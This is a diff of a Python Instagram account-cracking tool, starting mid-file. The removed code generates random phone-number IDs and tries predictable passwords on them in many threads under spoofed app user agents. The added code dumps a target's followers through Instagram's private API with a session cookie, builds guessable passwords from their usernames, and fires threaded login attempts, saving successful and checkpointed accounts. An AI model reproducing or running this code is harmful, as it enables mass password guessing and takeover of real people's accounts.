47','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
-    igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
-    igve=igv.split(",")
-    versi=random.choice(igve)
-    ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; {kode})'
-    ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1820; 1820; mt6762; {basa}; {kode})'
-    ua3 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})'
-    ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})'
-    uaa = rc([ua1,ua2,ua3,ua4])
-    return uaa
-
-def generate_random_ids(limit):
-    """Generate random 6-digit IDs"""
-    idz.clear()
-    for _ in range(limit):
-        random_id = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(random_id)
-    return idz
-
-def get_password_patterns(uid):
-    """Generate password patterns based on UID"""
-    return [
-        uid[:6],     # First 6 digits
-        uid[:8],     # First 8 digits
-        uid,         # Full number
-        '57273200',  # Static common password
-    ]
-
-def random_number():
-    """Main random number cloning function"""
-    clear()
-    
-    print(f"\033[1;96m{'='*56}")
-    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
-    print(f"\033[1;96m{'='*56}")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
-    linex()
-    
-    # Get user input
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
-    # get user limit
-    try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
-        limit = 99999
-        time.sleep(2)
-    
-    # Generate random IDs
-    print(f" \033[1;93m[*] Generating {limit} random IDs...")
-    generate_random_ids(limit)
-    
-    # Reset global counters
-    global loop, oks, cps
-    with counter_lock:
-        loop = 0
-    with success_lock:
-        oks.clear()
-    cps.clear()
-    
-    # Display start information
-    clear()
-    print(f"\033[1;96m{'='*56}")
-    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
-    print(f"\033[1;96m{'='*56}")
-    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
-    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
-    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
-    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
-    linex()
-    
-    # Start multi-threaded attack
-    start_time = time.time()
-    
-    with ThreadPoolExecutor(max_workers=30) as executor:
-        futures = []
+class Instagram:
+    def __init__(self):
+        self.success, self.chekpoint, self.faktor ,self.looping = 0,0,0,0
+        self.Create_Mkdir()
+                
+    def Create_Mkdir(self):
+        try: os.mkdir('/sdcard/OK')
+        except: pass
+        try: os.mkdir('/sdcard/2F')
+        except: pass
+        try: os.mkdir('/sdcard/CP')
+        except: pass 
         
-        for random_id in idz:
-            uid = code + random_id
-            password_patterns = get_password_patterns(uid)
-            future = executor.submit(crack, uid, password_patterns, len(idz))
-            futures.append(future)
+    def Remove_Cookies(self):
+        try: os.system('rm -rf .cookie_instagram.json')
+        except (Exception) as e: pass
+        Login().Login_Akun_Instagram()
         
-        # Wait for all tasks to complete
-        for future in as_completed(futures):
+    def Simpan_Result(self):
+        hari, tanggal, bulan, tahun, jam = Require().Kalender()
+        self.hari_ini = (f'{hari}-{tanggal}-{bulan}-{tahun}')
+        self.bulan = ['januari', 'februari', 'maret', 'april',  'mei', 'juni', 'juli','agustus', 'september', 'oktober', 'november', 'desember']
+        return(f'instagram-ok-{self.hari_ini}.txt',f'instagram-2f-{self.hari_ini}.txt',f'Instagram-cp-{self.hari_ini}.txt')
+        
+    def Chek_Cookies(self):
+        try:
+            cookies = json.loads(open('.cookie_instagram.json', 'r').read())['Cookie']
+            self.Menu_Instagram(cookies)          
+        except (FileNotFoundError) as e:
+            Terminal().clear_terminal_size()
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            time.sleep(3.5)
+            self.Remove_Cookies()
+           
+    def Menu_Instagram(self, cookies):
+        try:
+            self.username, self.fullname = Login().Validasi_Cookies(cookies)
+        except (KeyError) as e:
+            Terminal().clear_terminal_size()
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            time.sleep(3.5)
+            self.Remove_Cookies()
+                        
+        except (requests.exceptions.ConnectionError) as e:
+            Terminal().clear_terminal_size()
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            time.sleep(3.5)
+            sys.exit()
+        try:                     
+            Terminal().banner_instagram()
+            Console().print(f'\n [bold green]•[bold white] Username : [bold green]{self.username} \n [bold green]•[bold white] Fullname : [bold green]{self.fullname}')
+        except (AttributeError) as e:
+            Terminal().clear_terminal_size()
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            exit()
+        Console().print('\n [bold green]01[bold white]. dump followers or followings\n [bold green]02[bold white]. upgrade script ke premium\n  [bold red]E[bold white]. keluar dari tools')
+        query = Console().input("\n [bold green]?[bold white] choose : ")
+        if query == '01' or query == '1':
             try:
-                future.result()
-            except KeyboardInterrupt:
-                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
-                executor.shutdown(wait=False)
-                return
-            except Exception as e:
-                print(f"\n\033[1;91m[!] Task failed: {e}")
-    
-    # Calculate execution time
-    end_time = time.time()
-    execution_time = end_time - start_time
-    
-    # Display results
-    linex()
-    print(f"\033[1;92m{'='*56}")
-    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
-    print(f"\033[1;92m{'='*56}")
-    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
-    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
-    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
-    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
-    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
-    
-    if len(oks) > 0:
-        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
-    else:
-        print(f" \033[1;91m[😞] No successful logins found this time.")
-    
-    linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")
-
-def menu():
-    """Interactive main menu"""
-    while True:
-        clear()
-        print(f"\033[1;96m{'='*56}")
-        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
-        print(f"\033[1;96m{'='*56}")
-        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
-        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
-        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
-        print(f"\033[1;96m{'='*60}")
-        
-        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
-        
-        if choice == '1':
-            random_number()
-        elif choice == '2':
-            clear()
-            print(f"\033[1;96m{'='*56}")
-            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
-            print(f"\033[1;96m{'='*56}")
-            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
-            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
-            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
-            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
-            linex()
-            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
-        elif choice == '3':
-            clear()
-            print(f"\033[1;92m{'='*56}")
-            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
-            print(f"\033[1;92m{'='*56}")
-            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
-            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
-            time.sleep(3)
-            break
+                Console().print(f'\n [bold green]•[bold white] silahkan masukan type dump, ketik followers untuk dump dari followers dan ketik following untuk dump dari following, ketik dengan benar jangan sampai salah!')
+                type_dump = Console().input("\n [bold green]?[bold white] type dump : ")
+                Console().print(f'\n [bold green]•[bold white] silahkan masukan username akun instagram target pastikan tidak terkunci dan centang biru, anda juga bisa menggunakan koma untuk dump masal, misalnya : zoraa_dev01, zoraa_dev02, zoraa_dev03 dan gunakan [italic red]ctrl + c[italic white] untuk berhenti!')
+                username = Console().input("\n [bold green]?[bold white] username : ")
+                for self.username in username.split(','):
+                    id_target = Require().Convert_Username(self.username, cookies)
+                try: self.Dump_Instagram(id_target, type_dump, cookies, '')
+                except (Exception) as e: pass
+                if len(dump) < 50:
+                    Console().print(f"\n [bold red]•[bold white] jumlah yang anda dump terlalu sedikit anda harus mencari target lain dan pastikan target yang terkumpul lebih dari 50 username!")
+                    exit()
+                else:
+                    Console().print(f"\n [bold green]•[bold white] dump {type_dump} : [bold green]{str(len(dump))}!")
+                    self.Methode()
+            except (Exception) as e:
+                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                exit()
+                
+        elif query == '02' or query == '2':
+            try: os.system(f'xdg-open https://wa.me/+6283140199711?text=assalamualaikum%20bang%20Zoraa%20Dev,%20mau%20upgrade%20ke%20premium%20dong'); exit()
+            except (Exception) as e:
+                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                exit()
+                
+        elif query == 'e' or query == 'E':
+            try: self.Remove_Cookies()
+            except (Exception) as e:
+                Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                exit()
         else:
-            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
-            time.sleep(2)
-
-if __name__ == "__main__":
-    try:
-        # Check for required modules
-        required_modules = ['requests', 'urllib.request']
-        missing_modules = []
-        
-        for module in required_modules:
+            Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
+            exit()
+            
+    def Dump_Instagram(self, username, type_dump, cookies, cursor):
+        with requests.Session() as r:
             try:
-                __import__(module)
-            except ImportError:
-                missing_modules.append(module)
+                response = r.get('https://i.instagram.com/api/v1/friendships/{}/{}/?count=100&max_id={}'.format(username,type_dump,cursor), headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)","cookie": cookies}).json()
+                for akun in response['users']:
+                    if akun not in dump:
+                        dump.append(akun['username']+'<=>'+akun['full_name'])
+                        Console().print(f" [bold green]•[bold white] dump [bold green]@{str(akun['username'])[:20]}[bold white]/[bold blue]{str(len(dump))} [bold white]username {type_dump}     ", end='\r')
+                if "next_max_id" in str(response):
+                    self.Dump_Instagram(username, type_dump, cookies, response["next_max_id"])
+            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass 
+            
+    def Methode(self):
+        try:
+            Console().print('\n [bold green]01[bold white]. login from private api [bold blue]threads\n [bold green]02[bold white]. login from private api [bold blue]smartlock')
+            Method = Console().input("\n [bold green]?[bold white] choose : ")
+            self.Exec_Method(Method)
+        except (Exception) as e:
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            exit()                     
+            
+    def Exec_Method(self, Method):
+        self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
+        Console().print(f'\n [bold green]•[bold white] Result Ok : internal/OK/{self.result_ok}\n [bold green]•[bold white] Result Cp : internal/Cp/{self.result_cp}\n [bold green]•[bold white] Result 2f : internal/2f/{self.result_two}')
+        Console().print(f'\n [bold green]•[bold white] Mainkan mode pesawat setiap 200 loop!\n')
+        with ThreadPoolExecutor(max_workers=30) as V:
+            for Username_And_Fullname in dump:
+                username, fullname = Username_And_Fullname.split('<=>')
+                password = []
+                for nama in username.split(' '):
+                    if len(nama) < 3:
+                        continue
+                    else:
+                        for passwords in [f'{nama}123', f'{nama}1234', f'{nama}12345', f'{nama}123456']:
+                             if len(passwords) < 6 or str(passwords).isalnum() == False or len(username.split(' ')) > 5:
+                                continue
+                             else:
+                                password.append(f'{str(passwords).lower()}')
+                for passwords in [f'{username}', f'{username.replace(" ", "")}']:
+                    if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
+                        continue
+                    else:
+                        password.append(f'{str(passwords).lower()}')
+                if Method in ('1') or Method in ('01'):
+                    V.submit( self.Exec_Threads, username, password)
+                elif Method in ('2') or Method in ('02'):
+                    V.submit(self.Exec_Smartlock, username, password)
+                else: V.submit(self.Exec_Threads, username, password)
